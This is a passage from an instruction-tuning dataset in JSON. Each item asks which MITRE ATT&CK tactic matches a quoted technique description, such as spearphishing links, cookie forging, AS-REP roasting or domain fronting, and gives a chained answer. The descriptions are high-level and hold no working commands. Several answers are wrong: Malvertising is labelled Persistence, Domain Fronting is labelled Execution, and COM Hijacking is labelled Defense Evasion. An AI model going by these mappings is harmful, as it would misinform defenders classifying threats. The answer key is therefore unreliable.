    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.",
    "context": "",
    "output": "The given description is related to sub technique Spearphishing Link (T1566.002);\nSub technique Spearphishing Link (T1566.002) is a type of technique Phishing (T1566);\nTechnique Phishing (T1566) is a type of tactic Initial Access (TA0001);\nTherefore, the given description is related to tactic Initial Access (TA0001).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.",
      "answer": "The given description is related to sub technique Spearphishing Link (T1566.002);\nSub technique Spearphishing Link (T1566.002) is a type of technique Phishing (T1566);\nTechnique Phishing (T1566) is a type of tactic Initial Access (TA0001);\nTherefore, the given description is related to tactic Initial Access (TA0001).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders\u2019 awareness of malicious activity. Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.\n\nRather than or in addition to Indicator Blocking, an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., Disable or Modify Tools). An adversary can also present a \u201chealthy\u201d system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.\n\nFor example, adversaries may show a fake Windows Security GUI and tray icon with a \u201chealthy\u201d system status after Windows Defender and other system tools have been disabled.",
    "context": "",
    "output": "The given description is related to sub technique Spoof Security Alerting (T1562.011);\nSub technique Spoof Security Alerting (T1562.011) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders\u2019 awareness of malicious activity. Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.\n\nRather than or in addition to Indicator Blocking, an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., Disable or Modify Tools). An adversary can also present a \u201chealthy\u201d system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.\n\nFor example, adversaries may show a fake Windows Security GUI and tray icon with a \u201chealthy\u201d system status after Windows Defender and other system tools have been disabled.",
      "answer": "The given description is related to sub technique Spoof Security Alerting (T1562.011);\nSub technique Spoof Security Alerting (T1562.011) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",
    "context": "",
    "output": "The given description is related to sub technique: IP Addresses (T1590.005);\nSub technique IP Addresses (T1590.005) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: Search Open Technical Databases). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",
      "answer": "The given description is related to sub technique: IP Addresses (T1590.005);\nSub technique IP Addresses (T1590.005) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).?",
    "context": "",
    "output": "The given description is related to sub technique Network Topology (T1590.004);\nSub technique Network Topology (T1590.004) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Technical Databases or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services).",
      "answer": "The given description is related to sub technique Network Topology (T1590.004);\nSub technique Network Topology (T1590.004) is a type of technique Gather Victim Network Information (T1590);\nTechnique Gather Victim Network Information (T1590) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements. Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software. Adversary\u2019s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts. \n\nMalvertising may be used to support Drive-by Target and Drive-by Compromise, potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement. Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.?",
    "context": "",
    "output": "The given description is related to sub technique Malvertising (T1583.008);\nSub technique Malvertising (T1583.008) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements. Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software. Adversary\u2019s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts. \n\nMalvertising may be used to support Drive-by Target and Drive-by Compromise, potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement. Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.",
      "answer": "The given description is related to sub technique Malvertising (T1583.008);\nSub technique Malvertising (T1583.008) is a type of technique Acquire Infrastructure (T1583);\nTechnique Acquire Infrastructure (T1583) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from Steal Web Session Cookie and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces. The generation of web cookies often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources (Web Session Cookie), which may bypass multi-factor and other authentication protection mechanisms.?",
    "context": "",
    "output": "The given description is related to sub technique: Web Cookies (T1606.001);\nSub technique Web Cookies (T1606.001) is a type of technique Forge Web Credentials (T1606);\nTechnique Forge Web Credentials (T1606) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from Steal Web Session Cookie and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces. The generation of web cookies often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources (Web Session Cookie), which may bypass multi-factor and other authentication protection mechanisms.",
      "answer": "The given description is related to sub technique: Web Cookies (T1606.001);\nSub technique Web Cookies (T1606.001) is a type of technique Forge Web Credentials (T1606);\nTechnique Forge Web Credentials (T1606) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model (DCOM).\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.?",
    "context": "",
    "output": "The given description is related to sub technique Component Object Model (T1559.001);\nSub technique Component Object Model (T1559.001) is a type of technique Inter-Process Communication (T1559);\nTechnique Inter-Process Communication (T1559) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model (DCOM).\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.",
      "answer": "The given description is related to sub technique Component Object Model (T1559.001);\nSub technique Component Object Model (T1559.001) is a type of technique Inter-Process Communication (T1559);\nTechnique Inter-Process Communication (T1559) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages. \n\nPreauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials.  \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. \n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",
    "context": "",
    "output": "The given description is related to sub technique: AS-REP Roasting (T1558.004);\nSub technique AS-REP Roasting (T1558.004) is a type of technique Steal or Forge Kerberos Tickets (T1558);\nTechnique Steal or Forge Kerberos Tickets (T1558) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages. \n\nPreauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials.  \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. \n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",
      "answer": "The given description is related to sub technique: AS-REP Roasting (T1558.004);\nSub technique AS-REP Roasting (T1558.004) is a type of technique Steal or Forge Kerberos Tickets (T1558);\nTechnique Steal or Forge Kerberos Tickets (T1558) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
    "context": "",
    "output": "The given description is related to sub technique: Component Object Model Hijacking (T1546.015);\nSub technique Component Object Model Hijacking (T1546.015) is a type of technique Event Triggered Execution (T1546);\nTechnique Event Triggered Execution (T1546) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
      "answer": "The given description is related to sub technique: Component Object Model Hijacking (T1546.015);\nSub technique Component Object Model Hijacking (T1546.015) is a type of technique Event Triggered Execution (T1546);\nTechnique Event Triggered Execution (T1546) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.?",
    "context": "",
    "output": "The given description is related to sub technique Domain Fronting (T1090.004);\nSub technique Domain Fronting (T1090.004) is a type of technique Proxy (T1090);\nTechnique Proxy (T1090) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
      "answer": "The given description is related to sub technique Domain Fronting (T1090.004);\nSub technique Domain Fronting (T1090.004) is a type of technique Proxy (T1090);\nTechnique Proxy (T1090) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).?",
    "context": "",
    "output": "The given description is related to sub technique: Tool (T1588.002);\nSub technique Tool (T1588.002) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
      "answer": "The given description is related to sub technique: Tool (T1588.002);\nSub technique Tool (T1588.002) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.?",
    "context": "",
    "output": "The given description is related to sub technique: Msiexec (T1218.007);\nSub technique Msiexec (T1218.007) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.",
      "answer": "The given description is related to sub technique: Msiexec (T1218.007);\nSub technique Msiexec (T1218.007) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing).",
    "context": "",
    "output": "The given description is related to sub technique: Identify Roles (T1591.004);\nSub technique Identify Roles (T1591.004) is a type of technique Gather Victim Org Information (T1591);\nTechnique Gather Victim Org Information (T1591) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
